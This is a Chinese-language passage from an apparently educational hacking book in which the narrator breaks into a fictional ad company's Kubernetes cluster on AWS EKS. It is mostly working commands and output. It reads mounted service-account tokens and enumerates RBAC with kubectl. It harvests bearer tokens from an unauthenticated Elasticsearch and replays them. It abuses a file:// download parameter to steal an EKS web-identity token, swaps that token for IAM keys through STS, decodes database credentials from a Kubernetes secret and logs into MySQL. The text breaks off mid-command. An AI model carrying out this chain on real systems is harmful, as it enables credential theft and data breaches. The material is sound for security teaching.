# 第八章：《肖申克的救赎》：越狱

![](img/chapterart.png)

拥有了对 Kubernetes 的全新理解后，我们回到了调查应用程序中的临时远程 shell，收集信息、提升权限，并希望能够找到有关用户定向的有趣数据。

我们恢复了之前在 surveyapp 容器中的 shell 访问，并查看了环境变量：

```
shell> **env**

KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
```

通过我们的新知识，这些环境变量变得意义重大：`KUBERNETES_PORT_443_TCP` 必须指向隐藏 API 服务器的集群 IP，这个著名的 Kube 协调器。文档指出 API 遵循 OpenAPI 标准，因此我们可以使用臭名昭著的 `curl` 工具，访问默认的 */api* 路由。`curl` 中的 `-L` 选项会跟随 HTTP 重定向，而 `-k` 选项则忽略 SSL 证书警告。我们在清单 8-1 中尝试了一下。

```
shell> **curl -Lk https://10.100.0.1/api**

message: forbidden: User "system:anonymous" cannot get path "/api",
reason: Forbidden
```

清单 8-1：尝试访问 API 服务器上的默认 */api* 路由

啊，我们被锁定了。我们得到的响应并不令人惊讶。从 1.8 版本开始，Kubernetes 发布了稳定版的 *基于角色的访问控制*（*RBAC*），这是一种安全模型，可以限制未经授权的用户访问 API 服务器。即使是监听在 8080 端口上的“不安全” API 也被限制为只允许本地地址访问：

```
shell> **curl -L http://10.100.0.1:8080**
(timeout)
```

为了看看我们是否能够绕过这一点，我们将更仔细地研究 Kubernetes 的 RBAC 系统。

## Kube 中的 RBAC

Kubernetes RBAC 遵循了一个相当标准的实现。管理员可以为人工操作员创建用户账户，或为 pod 分配服务账户。每个用户或服务账户都可以绑定到一个持有特定权限的角色——如 `get`、`list`、`change` 等——该角色控制对 pod、节点和机密等资源的访问。主体（用户或服务账户）与角色之间的关联被称为 *绑定*。

就像其他任何 Kube 资源一样，服务账户、角色及其绑定也定义在存储在 etcd 数据库中的清单文件中。服务账户的定义类似于清单 8-2。

```
# define a service account

apiVersion: v1
kind: ServiceAccount   # deploy a service account
metadata:
  - name: metrics-ro   # service account's name
--
# Bind metrics-ro account to cluster admin role

apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: manager-binding # binding's name
subjects:
- kind: ServiceAccount
  name: metrics-ro      # service account's name
  apiGroup: ""
roleRef:
  kind: ClusterRole
  name: cluster-admin # default role with all privileges
  apiGroup: ""
```

清单 8-2：`ClusterRoleBinding` 清单文件

一个管理员如果想要将服务账户分配给普通的 pod，可以添加一个名为 `serviceAccountName` 的属性，像这样：

```
apiVersion: v1
kind: Pod  # We want to deploy a Pod
metadata:
`--snip--`
spec:
  containers:
    serviceAccountName: metrics-ro
    - name: nginx   # First container
`--snip--`
```

之前，我们在没有提供任何身份验证的情况下访问了 API 服务器——因此我们自然被分配了默认的 `system:anonymous` 用户，该用户没有任何权限。这使得我们无法访问 API 服务器。常识告诉我们，一个没有 `serviceAccountName` 属性的容器，也会继承相同的匿名账户状态。

这是一个合理的假设，但 Kube 的操作方式不同。每个没有服务账户的 pod 会自动分配 `system:serviceaccount:default:default` 账户。注意“匿名”和“默认”之间的微妙区别。默认看起来比匿名更不危险，它更值得信任，甚至在容器内部挂载了认证令牌！

我们搜索容器默认挂载的服务帐户：

```
shell> **mount |grep -i secrets**
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime)

shell> **cat /run/secrets/kubernetes.io/serviceaccount/token**
eyJhbGciOiJSUzI1NiIsImtpZCI6ImQxNWY4MzcwNjI5Y2FmZGRi...
```

该帐户令牌实际上是一个签名的 JavaScript 对象表示法（JSON）字符串——也称为*JSON Web Token*（*JWT*）——包含识别服务帐户的信息。我们可以对 JWT 字符串的部分进行 base64 解码，以确认默认服务帐户的身份并获取一些信息：

```
shell> **cat /run/secrets/kubernetes.io/serviceaccount/token \**
**| cut -d "." -f 2 \**
**| base64 -d**

{
"iss": "kubernetes/serviceaccount",

"kubernetes.io/serviceaccount/namespace": "prod",

"kubernetes.io/serviceaccount/secret.name": "default-token-2mpcg",

"kubernetes.io/serviceaccount/service-account.name": "default",

"kubernetes.io/serviceaccount/service-account.uid": "956f6a5d-0854-11ea-9d5f-06c16d8c2dcc",

"sub": "system:serviceaccount:prod:default"
}
```

JWT 有几个常规字段，也称为*注册声明*：发行者（`iss`），在此情况下是 Kubernetes 服务帐户控制器；主题（`sub`），即帐户的名称；以及命名空间（稍后会详细说明），在此情况下是`prod`。显然，我们无法更改这些信息以冒充另一个帐户，否则会使附加到此 JSON 文件的签名无效。

*命名空间*是将 Kube 资源（如 Pods、服务帐户、秘密等）分组的逻辑分区，通常由管理员设置。它是一个软性隔离，允许更细粒度的 RBAC 权限；例如，具有“列出所有 Pods”权限的角色将仅限于列出属于其命名空间的 Pods。默认服务帐户也依赖于命名空间。我们刚刚检索到的帐户的标准名称是`system:serviceaccount:prod:default`。

该令牌为我们提供了第二次查询 API 服务器的机会。我们将文件内容加载到`TOKEN`变量中，并重试我们在清单 8-1 中的第一个 HTTP 请求，将`TOKEN`变量作为`Authorization`头发送：

```
shell> **export TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)**

shell> **curl -Lk https://10.100.0.1/api --header "Authorization: Bearer $TOKEN"**

 "kind": "APIVersions",
  "versions": ["v1"],
  "serverAddressByClientCIDRs": [{
    "clientCIDR": "0.0.0.0/0",
    "serverAddress": "ip-10-0-34-162.eu-west-1.compute.internal:443"
  }]
```

哦！看起来默认的服务帐户确实比匿名帐户拥有更多权限。我们成功地在集群内部获取了一个有效的身份。

## 侦查 2.0

现在进行一些侦查。我们下载位于*https://10.100.0.1/openapi/v2*端点的 API 规范并探索我们的选项。

我们从获取集群的*/version*端点开始。如果集群足够老，可能有机会利用公共漏洞提升权限：

```
shell> **curl -Lk https://10.100.0.1/version --header "Authorization: Bearer $TOKEN"**
{
    "major": "1",
    "minor": "14+",
    "gitVersion": "v1.14.6-eks-5047ed",
    "buildDate": "2019-08-21T22:32:40Z",
    "goVersion": "go1.12.9",
`--snip--`
}
```

MXR Ads 正在运行由 Elastic Kubernetes Service（EKS）支持的 Kubernetes 1.14，这是 AWS 托管版的 Kubernetes。在这种设置中，AWS 在他们自己的主节点池中托管 API 服务器、etcd 和其他控制器，这些节点也被称为*控制平面*。客户（此处为 MXR Ads）只托管工作节点（数据平面）。

这是重要信息，因为 AWS 版本的 Kube 允许 IAM 角色与服务帐户之间建立比自托管版本更强的绑定。如果我们攻破正确的 Pod 并获取令牌，我们不仅可以攻击 Kube 集群，还可以攻击 AWS 资源！

我们继续探索，通过尝试从我们获取的 OpenAPI 文档中使用几个 API 端点。我们尝试了*api/v1/namespaces/default/secrets/*，*api/v1/namespaces/default/serviceaccounts*，以及一系列其他与 Kube 资源对应的端点，但我们反复收到 401 错误消息。如果我们继续这样下去，错误率将引起不必要的关注。幸运的是，有一个 Kube API 叫做*/apis/authorization.k8s.io/v1/selfsubjectaccessreview*，它可以立即告诉我们是否能够对给定对象执行操作。

手动通过`curl`查询调用它很麻烦，因为这需要一个长而丑陋的 JSON 负载，所以我们通过反向 Shell 下载 Kubectl 程序。这次我们不需要设置配置文件，因为 Kubectl 会自动发现由集群注入的环境变量，从挂载的目录加载当前令牌，并立即 100%正常运行。在这里，我们下载 Kubectl 二进制文件，使其可执行，并再次获取集群版本：

```
shell> **wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/kubectl**

shell> **chmod +x kubectl && ./kubectl version**

Server Version: version.Info {Major:"1", Minor:"14+", GitVersion:"v1.14.6-eks-5047ed"...
```

完美！一切正常运行。现在我们反复执行`auth can-i`命令，针对最常见的指令——`get pods`、`get services`、`get roles`、`get secrets`等——全面探索我们正在操作的默认令牌所分配的所有权限：

```
shell> ./**kubectl version auth can-i get nodes**
no
shell> ./**kubectl version auth can-i get pods**
yes
```

我们很快得出结论，目前我们唯一拥有的权限是列出集群中的 Pods。但当我们明确执行`get pods`命令时，出现了以下错误：

```
shell> **./kubectl get pods**
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:prod:default" cannot list resource "pods" in
API group "" in the namespace "default"
```

如果我们尝试针对`prod`命名空间——也就是托管我们服务账户的命名空间——进行操作，会怎么样呢？

```
shell> ./**kubectl get pods -n prod**

stats-deployment-41de-4jxa1     1/1 Running   0    13h51m

redis-depl-69dc-0vslf           1/1 Running   0    21h43m

ssp-elastic-depl-3dbc-3qozx     1/1 Running   0    14h39m

ssp-feeder-deployment-13fe-3evx 1/1 Running   0    10h18m

api-core-deployment-d34c-7qxm   1/1 Running   0    10h18m
`--snip--`
```

不错！我们获得了在`prod`命名空间中运行的数百个 Pods 的列表。

由于所有缺乏身份的 Pods 都使用相同的默认服务账户运行，如果某人授予此默认账户额外的权限，则所有与相同身份运行的其他 Pods 都会自动继承这些权限。只需要有人执行一个不经意的`kubectl apply -f` `<url>`，从一个不显眼的 GitHub 仓库获取一个设计不良的资源定义，并匆忙将其应用到集群中。人们有时说，这个 Kubectl 安装命令是新的`curl` `<url>` `| sh`。这就是复杂性的隐藏代价：人们可以盲目地从 GitHub 拉取并应用清单文件，而不检查或甚至理解他们所执行的指令的影响，有时还会授予默认服务账户额外的权限。这很可能就是本案例中发生的情况，因为默认账户没有内建的权限集。

但这仅仅是冰山一角。使用正确的标志，我们甚至可以提取每个 Pod 的完整清单，提供大量信息，如列表 8-3 所示。

```
shell> **./kubectl get pods -n prod -o yaml > output.yaml**
shell> **head -100 output.yaml**

`--snip--`
spec:
  containers:
  - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/api-core
    name: api-core
  - env:
    - name: DB_CORE_PASS
      valueFrom:
        secretKeyRef:
          key: password
          name: dbCorePassword
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: apicore-token-2mpcg
      readOnly: true
  nodeName: ip-192-168-162-215.eu-west-1.compute.internal
  hostIP: 192.168.162.215
  phase: Running
  podIP: 10.0.2.34
`--snip--`
```

列表 8-3：下载 Pod 清单文件

而且那个截断的输出，朋友们，仅仅是一个 pod！我们只有获取 pod 信息的权限，但幸运的是，这意味着我们可以访问 pod 清单文件，其中包含 pod 运行的节点、机密名称、服务账户、挂载的卷等等。这几乎是在命名空间级别上进行的完全侦察，只需要一个小小的权限。

然而，输出是极其难以利用的。手动挖掘 YAML 文件是一种惩罚，应该只留给你的死敌。我们可以使用 Kubectl 强大的自定义输出过滤器来格式化清单 8-3 的结果：

```
shell> **./kubectl get pods -o="custom-columns=\**
**NODE:.spec.nodeName,\**
**POD:.metadata.name"**

NODE                       POD
ip-192-168-162-215.eu-...  api-core-deployment-d34c-7qxm
ip-192-168-12-123.eu-...   ssp-feeder-deployment-13fe-3evx
ip-192-168-89-110.eu-...   redis-depl-69dc-0vslf
ip-192-168-72-204.eu-...   audit-elastic-depl-3dbc-3qozx
```

这个相当明确的命令只显示 pods 清单中的`spec.nodeName`和`metadata.name`字段。让我们获取一些额外的数据，比如机密、服务账户、pod IP 等。如清单 8-4 所示，过滤器变得更厚了，但它基本上是遍历 YAML 中的数组和映射，以提取相关信息。

```
shell> **./** **kubectl get pods -o="custom-columns=\**
**NODE:.spec.nodeName,\**
**POD:.metadata.name,\**
**PODIP:.status.podIP,\**
**SERVICE:.spec.serviceAccount,\**
**ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\**
**FILESECRET:.spec.volumes[*].secret.secretName"**

NODE       POD       PODIP       SERVICE    ENV           FILESECRET
ip-192...  api-...   10.0.2...   api-token  dbCore...     api-token-...
ip-192...  ssp-f...  10.10...    default    dbCass...     default-...
ip-192...  ssp-r...  10.0.3...   default    <none>        default-...
ip-192...  audit...  10.20...    default    <none>        default-...
ip-192...  nexus...  10.20....   default    <none>        deploy-secret...
```

清单 8-4：命名空间级别的完全侦察：节点和 pod 名称、pod IP、服务账户和机密

我已经截断了输出以适应页面，因此在这里描述一下。前两列包含节点和 pod 的名称，帮助我们推测运行在里面的应用性质。第三列是 pod 的 IP，感谢 Kube 的扁平网络设计，这直接将我们带到应用。

第四列列出了附加到每个 pod 的服务账户。任何非`default`的值意味着该 pod 可能以额外的权限运行。

最后两列列出了 pod 加载的机密，可能是通过环境变量或通过磁盘上挂载的文件加载的。机密可以是数据库密码、我们用来执行此命令的服务账户令牌等。

做黑客真是个好时光！还记得之前侦察需要扫描/16 网络，等待四小时才能得到部分相似的输出吗？现在只需要一个命令。当然，如果默认服务账户没有“获取 pod”权限，我们就得依赖盲目的网络扫描，扫描我们的容器 IP 范围。AWS 非常关注这种异常的网络流量，所以在调整 Nmap 时要小心，避免暴露在雷达下。

我们在清单 8-4 中检索到的 pod 名称充满了广告和技术关键词，例如 SSP、api、kakfa 等。可以放心假设，MXR Ads 在 Kubernetes 上运行了所有涉及广告投放过程的应用。这一定使他们能够根据流量上下扩展应用。我们继续探索其他 pods，并发现一些容器实际加载了 AWS 凭证。哦，这将会带来麻烦：

```
NODE       ip-192-168-162-215.eu-west-1.compute.internal
POD        creative-scan-depl-13dd-9swkx
PODIP      10.20.98.12
PORT       5000
SERVICE    default
ENV        AWS_SCAN_ACCESSKEY, AWS_SCAN_SECRET
FILESECRET default-token-2mpcg
```

我们还发现了一些数据存储，如 Redis 和 Elasticsearch。这将会很有趣。

## 破入数据存储

目前我们最重要的优势是我们成功穿越了防火墙边界。我们已进入集群，处于所谓的*受信区*。DevOps 管理员仍然抱有错误的假设，认为存在受信网络，即便这个网络属于云服务提供商。John Lambert 关于防御者心态的文章（[`github.com/JohnLaTwC/Shared`](https://github.com/JohnLaTwC/Shared)）依然准确：“防御者以列表为思维，攻击者以图形为思维。只要这个事实存在，攻击者就赢了。”

Redis 是一个主要用于缓存的键值内存数据库，而 Elasticsearch 是一个面向文本搜索查询的文档数据库。从这个 pod 的描述中，我们可以得知 Elasticsearch 用于存储某些（或可能是所有）应用的审计日志：

```
NODE       ip-192-168-72-204.eu-west-1.compute.internal
POD        audit-elastic-depl-3dbc-3qozx
PODIP      10.20.86.24
PORT       9200
SERVICE    default
ENV.       <none>
FILESECRET default-token-2mpcg
```

由于受信网络的荒谬性，认证和加密是最先被放弃的措施。我至今还没遇到过需要认证的内网 Redis 数据库。Elasticsearch 和其他著名的非关系型数据库也是如此，它们开玩笑地要求管理员在“安全”的环境中运行应用程序，不知道那意味着什么。

我理解。安全性显然不是管理员的工作；他们更愿意关注性能、可用性和数据一致性。但这种思维方式不仅是有缺陷的，而且是鲁莽的。安全是任何数据驱动技术的首要要求。数据承载信息，信息等同于权力。自从人类学会八卦以来，这一点就一直是对的。管理员忽视安全，就像核电厂声称它的唯一工作是分裂铀同位素。安全措施？“不，我们不做这些。我们把反应堆放在一个安全的建筑里运行。”

我们选择首先关注 Elasticsearch 的 pods，因为审计日志总是一个有价值的情报来源。它们会记录诸如哪个服务与哪个数据库通信、哪些 URL 端点是活动的、数据库查询是什么样的。我们甚至能在不小心泄露到调试堆栈跟踪中的环境变量里找到密码。

我们回到 Elasticsearch 的 pod 描述，提取该 pod 的 IP 地址（10.20.86.24）和端口（9200），并准备查询该服务。默认情况下，Elasticsearch 没有启用认证，因此多亏了“受信环境”的神话，我们可以完全访问其中存储的数据。

Elasticsearch 将数据组织成*索引*，这些索引实际上是文档的集合。可以将索引视为传统关系型数据库系统（如 MySQL）中的数据库。在这里，我们拉取集群中定义的索引列表：

```
shell> **curl "10.20.86.24:9200/_cat/indices?v"**

health index id                          size
yellow test  CX9pIf7SSQGPZR0lfe6UVQ...   4.4kb
yellow logs  dmbluV2zRsG1XgGskJR5Yw...   154.4gb
yellow dev   IWjzCFc4R2WQganp04tvkQ...   4.4kb
```

我们看到有 154GB 的审计日志数据准备好进行探索。我们从日志索引中拉取最后几条文档：

```
shell> **curl "10.20.86.24:9200/log/_search?pretty&size=4"**

"hits": [{
`--snip--`
  "_source": {
1 "source": "dashboard-7654-1235",
  "level": "info",
2 "message": "GET /api/dashboard/campaign...\n
  Host: api-core\nAuthorization Bearer 9dc12d279fee485...",
  "timestamp": "2019-11-10T14:34:46.648883"
}}]
```

Elasticsearch 返回的四个元素中的 `message` 字段包含存储的原始日志信息。我们挖掘出看似是对 [api/dashboard/campaign/1395412512](http://api/dashboard/campaign/1395412512) URL 2 的 HTTP 请求。我们还发现了在第四章外部侦察阶段曾注意到的关于仪表盘应用的引用 1。审计日志中的 URL 暗示，由仪表盘应用加载的活动数据可能是通过名为 `api-core` 的内部端点检索的（参见 `Host` 头）2。

有趣的是，我们检索到的 HTTP 消息携带了一个授权令牌，可能是用来识别请求数据的用户。我们可以通过在 Elasticsearch 中应用正确的搜索过滤器 `message:Authorization` 来集中查看所有存储的令牌。这应该能帮助我们收集足够的令牌，伪装成仪表盘应用上所有当前活跃的用户：

```
shell> **curl "10.20.86.24:9200/log/_search?pretty&size=12&q=message:Authorization"**

"_timestamp": 1600579234
"message": "...Host: api-core\nAuthorization Bearer 8b35b04bebd34c1abb247f6baa5dae6c..."

"_timestamp": 1600581600
"message": "...Host: api-core\nAuthorization Bearer 9947c7f0524965d901fb6f43b1274695..."
`--snip--`
```

好的，我们有十多个在过去 12 小时内用于访问仪表盘应用及其扩展的 api-core Pod 的令牌。希望其中一些令牌仍然有效，并可以用于重放攻击。

我们可以通过 Kube 的自动 DNS 解析到达 `api-core` 服务名称后面的 Pod。或者，我们也可以随时直接提取其中一个 Pod 的 IP 地址，方法如下：

```
shell> **kubectl get pods -o wide | grep "api-core"**

NODE     ip-192-168-162-215.eu-west-1.compute.internal
POD      api-core-deployment-d34c-7qxm
PODIP    10.0.2.34
PORT     8080
```

我们重放了从审计索引中提取的随机 URL，并附上其授权令牌：

```
shell> **curl http://10.0.2.34/api/dashboard/campaign/1395412512 \**
**-H "Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c"**
{
   "progress": "0.3",
   "InsertionID": "12387642",
   "creative": "s4d.mxrads.com/7bcdfe206ed7c1159bb0152b7/...",1
   "capping": "40",
   "bidfactor": "10",
`--snip--`
```

我们成功了！虽然我们可能无法访问漂亮的仪表盘来可视化这些指标——至少目前还不能——但我们终于看到了一部分原始的活动数据。附加奖励：我们找到了广告中视频文件和图像的存储位置 1。让我们看一下这个 URL：

```
root@Point1:/# getent -t hosts s4d.mxrads.com
13.225.38.103   s4d.mxrads.com.s3.amazonaws.com
```

惊讶，惊讶，它重定向到了一个 S3 桶。我们尝试进入该桶，但遗憾的是，我们没有权限列出其中的内容，而且密钥看起来过于随机，无法暴力破解。也许 API 提供了一种按客户名称搜索的方式，来减轻我们的负担？

### API 探索

我们想在 API 中找到一个列出客户名称、视频和任何其他可能相关内容的方法。我们开始与 API 进行调试，发送无效的 ID 和随机的 URL 路径，并附上我们的有效令牌，希望能触发任何帮助信息或详细错误：

```
shell> **curl "http://10.0.2.34/api/randomPath" \**
**-H "Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c"**

{"level":"critical","message":"Path not found. Please refer to the docs
(/docs/v3) for more information"...
```

我们被引导到了一个文档 URL。对 */docs/v3* URL 发起的查询暴露了整个 API 文档：有哪些可用的端点、需要发送的参数、需要包含的头信息等等。真是太贴心了！

结果证明，我们的直觉并没有错：授权令牌确实与最终用户及其活动范围相关联。我们抓取的随机令牌不太可能有资格查看或编辑 Gretsch Politico 的活动（除非，当然，恰巧有一个活跃的 GP 用户或管理员当前正在与 api-core Pod 通信——不过，拜托，我们都知道圣诞节还得等好几个月）。

文档明确表示，api-core 端点是 MXR Ads 使用的每个交付应用程序的入口点。它是他们的主要数据库抽象层。它从多个数据源汇总业务信息，并提供交付过程的统一概览。

除了你会从一个全能 API 中期待的常规命令（获取广告系列、列出插入项、查找排除列表等），文档中提到的一个额外功能激起了我们的黑客直觉：使用报告。该功能描述如下：“*/usage-report* 端点生成一个报告文件，详细列出 API 的健康状况以及跟踪其性能和配置的多个指标*。”

配置真不错。我们喜欢“配置”这个词。配置数据通常包含密码、端点定义和其他 API 秘密。但还有更多。他们提到的那个报告文件……它是如何生成的？如何获取的？我们能下载它吗？如果能，能否修改 URL 来抓取其他文件？有没有任何检查？报告生成的动态特性可能会为我们提供一个切入点。

让我们试试这个报告使用功能。我们尝试生成一个报告，仔细检查一下：

```
shell> **curl http://10.0.2.34/usage-report/generate"**
**-H "Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c"**
{
 "status": "success",
    "report": "api-core/usage-report/file/?download=s3://mxrads-reports/98de2cabef81235dead4               .html"
}

shell> **curl api-core/usage-report/file/?download=s3://mxrads-reports/98de2cabef81235dead4.html**

`--snip--`
Internal configuration:
Latency metrics:
Environment:
PATH_INFO: '/usage-report'
PWD '/api/'
SHELL '/bin/bash/'

AWS_ROLE_ARN 'arn:aws:iam::886477354405:role/api-core.ec2'1 

AWS_WEB_IDENTITY_TOKEN_FILE '/var/run/secrets/eks.amazonaws.com/serviceaccount/token'2 

DB_CORE_PASS **********
DB_CORE_USER **********
DBENDPOINT=984195.cehmrvc73g1g.eu-west-1.rds.amazonaws.com 3 
`--snip--`
```

确实非常有趣！幸运的是，对于 MXR Ads 来说，使用报告生成器的开发者屏蔽了数据库用户和密码，所以没有简单的访问方式，但我们仍然得到了数据库端点 3：`984195.cehmrvc73g1g.eu-west-1.rds.amazonaws.com`。显然，数据是从 AWS 上的托管关系型数据库 RDS 中获取的。

但暂时先不管数据库。我们发现了一些可能让我们更有优势的东西。

我们将重点关注这两个特殊变量：`AWS_ROLE_ARN` 和 `AWS_WEB_IDENTITY_TOKEN_FILE`。根据 AWS 文档，当一个 IAM 角色被附加到 Kubernetes 服务账户时，AWS 管理版 Kubernetes（EKS）会注入这两个变量。这里的 api-core pod 可以用其 Kube 身份验证令牌交换为普通的 IAM 访问密钥，这些密钥携带 api-core.ec2 角色的权限 1。这是一次绝妙的权限提升！

如果能加载存储在 `AWS_WEB_IDENTITY_TOKEN_FILE` 文件中服务账户令牌，并将其交换为 IAM 访问密钥，看看我们能访问哪些内容，不能访问哪些内容，那将会很有意思。

`usage-report` 功能很可能能帮助我们实现这个目标。下载 URL 指向一个 S3 URL，但很可能它也接受其他 URL 处理程序，比如 `file://` 从磁盘加载文档，就像服务 `AWS_WEB_IDENTITY_TOKEN_FILE` 令牌文件 2：

```
shell> **curl api-core/usage-report/file?download=\**
**file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token**

eyJhbGciOiJSUzI1NiIsImtpZCI6ImQxNWY4MzcwNjI5Y2FmZGRiOGNjY2UzNjBiYzFjZGMwYWY4Zm...
```

当事情按预期顺利进行时真是太好了！我们获得了一个服务账户令牌。让我们看看能否将其交换为 IAM 密钥。如果我们解码这个令牌并与之前获得的默认 JWT 进行比较，我们会注意到一些关键的区别：

```
{
1 "aud": ["sts.amazonaws.com"],
  "exp": 1574000351,
2 "iss": "https://oidc.eks.eu-west-1.amazonaws.com/id/4BAF8F5",
  "kubernetes.io": {
    "namespace": "prod",
`--snip--`
    "serviceaccount": {
      "name": "api-core-account",
      "uid": "f9438b1a-087b-11ea-9d5f-06c16d8c2dcc"
    }
  "sub": "system:serviceaccount:prod:api-core-account"
}
```

服务帐户令牌具有一个观众属性 `aud` 1，它是接受我们刚解码的令牌的资源服务器。这里设置为 STS——AWS 服务，用于授予临时 IAM 凭证。令牌的颁发者 2 不再是服务帐户控制器，而是与 EKS 集群一起配置的 OpenID 服务器。*OpenID* 是一种认证标准，用于将认证委托给第三方。AWS IAM 信任该 OpenID 服务器，确保 JWT 中的声明被正确签名和认证。

根据 AWS 文档，如果一切设置正确，IAM 角色 api-core.ec2 也将被配置为信任由该 OpenID 服务器发出的模拟请求，并带有主题声明 `system:serviceaccount:prod:api-core-account`。

当我们调用 `aws sts assume-role-with-web-identity` API 并提供必要的信息（网络令牌和角色名称）时，我们应该会得到有效的 IAM 凭证：

```
root@Pointer1:/# AWS_ROLE_ARN="arn:aws:iam::886477354405:role/api-core.ec2"
root@Pointer1:/# TOKEN ="ewJabazetzezet..."

root@Pointer1:/# aws sts assume-role-with-web-identity \
**--role-arn $AWS_ROLE_ARN \**
**--role-session-name sessionID \**
**--web-identity-token $TOKEN \**
**--duration-seconds 43200**

{
    "Credentials": {
        "SecretAccessKey": "YEqtXSfJb3lHAoRgAERG/I+",
        "AccessKeyId": "ASIA44ZRK6WSYXMC5YX6",
        "Expiration": "2019-10-30T19:57:41Z",
        "SessionToken": "FQoGZXIvYXdzEM3..."
    },
`--snip--`
}
```

哈利路亚！我们刚刚将 Kubernetes 服务令牌升级为可以与 AWS 服务交互的 IAM 角色。通过这种新类型的访问权限，我们能造成什么样的影响？

### 滥用 IAM 角色权限

api-core 应用程序管理广告活动，包含指向存储在 S3 上的创意文件的链接，并具有许多其他功能。可以合理推测，相关的 IAM 角色具有一些扩展权限。我们从一个显而易见的权限开始，它从一开始就一直困扰着我们——列出 S3 上的桶：

```
root@Pointer1:/# aws s3api list-buckets
{
  "Buckets": [
     {
       "Name": "mxrads-terraform",
       "CreationDate": "2017-10-25T21:26:10.000Z"

       "Name": "mxrads-logs-eu",
       "CreationDate": "2019-10-27T19:13:12.000Z"

       "Name": "mxrads-db-snapshots",
       "CreationDate": "2019-10-26T16:12:05.000Z"
`--snip--`
```

终于！经过无数次尝试，我们终于找到了一个拥有 `ListBuckets` 权限的 IAM 角色。这花了一些时间！

不要太兴奋了。我们确实可以列出桶，但这并不能说明我们是否能够从这些桶中检索单个文件。然而，通过查看桶列表，我们获得了对 MXR Ads 操作模式的新见解。

例如，桶 mxrads-terraform 很可能存储了 *Terraform* 生成的状态，Terraform 是一个用于设置和配置云资源（如服务器、数据库和网络）的工具。状态是所有由 Terraform 生成和管理的资产的声明性描述，例如服务器的 IP、子网、IAM 角色、与每个角色和用户关联的权限等等。它甚至存储明文密码。即使我们的目标使用了像 Vault、AWS 密钥管理服务（KMS）或 AWS Secrets Manager 这样的密钥管理工具，Terraform 也会动态解密这些密码并将其明文版本存储在状态文件中。哦，我们愿意为访问那个桶付出什么代价。让我们试试看：

```
root@Point1:~/# aws s3api list-objects-v2 --bucket mxrads-terraform

An error occurred (AccessDenied) when calling the ListObjectsV2 operation:
Access Denied
```

唉，运气不好。凡事都得慢慢来。让我们回到我们的桶列表。

我们确认至少有一个桶 api-core 应该能够访问：s4d.mxrads.com，这是存储所有创意文件的桶。我们将使用我们的 IAM 权限列出该桶的内容：

```
root@Point1:~/# aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_creatives.txt
root@Point1:~/# head list_creatives.txt
{"Contents": [{
  "Key": "2aed773247f0203d5e672cb/125dad49652436/vid/720/6aa58ec9f77af0c0ca497f90c.mp4",

  "LastModified": "2015-04-08T22:01:48.000Z",
`--snip--`
```

嗯……是的，我们确实有权限访问 MXR Ads 在广告活动中使用的所有视频和图片，但我们不打算下载并播放数以 TB 计的媒体广告，只为找出 Gretsch Politico 使用的广告内容。肯定有更好的方法来检查这些文件。

是的，记得我们几分钟前获取的 Kubernetes 服务账户令牌吗？我们匆忙将其转换为 AWS 凭证，以至于几乎忘记了它本身所拥有的权限。那个服务账户是获取归属于 api-core pod 的集群资源的金钥匙。你猜猜 api-core 需要什么属性才能运行？数据库凭证！我们将利用数据库访问权限，瞄准 Gretsch Politico 的创意内容，然后使用我们新获得的 IAM 权限从 S3 下载这些视频。

### 滥用服务账户权限

我们回到忠实的反向 shell，发出一条新的 `curl` 命令给 API 服务器，这次带上了 api-core 的 JWT。我们请求在 pod 描述中找到的机密 `dbCorepassword`：

```
shell> **export TOKEN="ewJabazetzezet..."**
shell> **curl -Lk \**
**https://10.100.0.1/api/v1/namespaces/prod/secrets/dbCorepassword \**
**--header "Authorization: Bearer $TOKEN"**
{
    "kind": "Secret",
    "data": {
      "user": "YXBpLWNvcmUtcnc=",
      "password": "ek81akxXbGdyRzdBUzZs" }}
```

接着我们解码用户名和密码：

```
root@Point1:~/# echo YXBpLWNvcmUtcnc= |base64 -d
api-core-rw
root@Point1:~/# echo ek81akxXbGdyRzdBUzZs |base64 -d
zO5jLWlgrG7AS6l
```

瞧，广告活动数据库凭证是 `api-core-rw` / `zO5jLWlgrG7AS6l`。

### 渗透数据库

让我们从集群中启动数据库连接，以防 RDS 实例受到某些入口防火墙规则的保护。我们不确定要查询哪个数据库后端（RDS 支持 MySQL、Aurora、Oracle、SQL Server 等）。由于 MySQL 是最受欢迎的引擎，我们先尝试 MySQL：

```
shell> **export DBSERVER=984195.cehmrvc73g1g.eu-west-1.rds.amazonaws.com**

shell> **apt install -y mysql-client**
shell> **mysql -h $DBSERVER -u api-core-rw -pzO5jLWlgrG7AS6l -e "Show databases;"**

+--------------------+
| Database           |
+--------------------+
| information_schema |
| test               |
| campaigns          |
| bigdata            |
| taxonomy           |
--snip--
```

我们成功进入了。

定位 Gretsch Politico 的广告活动需要一些基本的 SQL 知识，这里我就不再详细讲解了。我们从列出服务器上的每一列、表和数据库开始。这些信息可以在`information_schema`数据库的`COLUMN_NAME`表中轻松找到：

```
shell> **mysql -h $DBSERVER -u api-core-rw -pzO5jLWlgrG7AS6l -e\**
**"select COLUMN_NAME,TABLE_NAME, TABLE_SCHEMA,TABLE_CATALOG from information_schema.columns;"**
+----------------------+--------------------+--------------+
| COLUMN_NAME          | TABLE_NAME         | TABLE_SCHEMA |
+----------------------+--------------------+--------------+
| counyter             | insertions         | api          |
| id_entity            | insertions         | api          |
| max_budget           | insertions         | api          |
`--snip--`
```

我们精挑细选了几列和表，这些很可能存有广告活动数据，然后通过几个`select`语句和`join`操作查询这些信息。这应该能给我们提供广告活动列表、创意 URL 和每个广告活动的预算——所有我们所需要的信息。我们确保再次使用我们偷来的凭证：

```
shell> **mysql -h $DBSERVER -u api-core-rw -pzO5jLWlgrG7AS6l campaigns -e\**
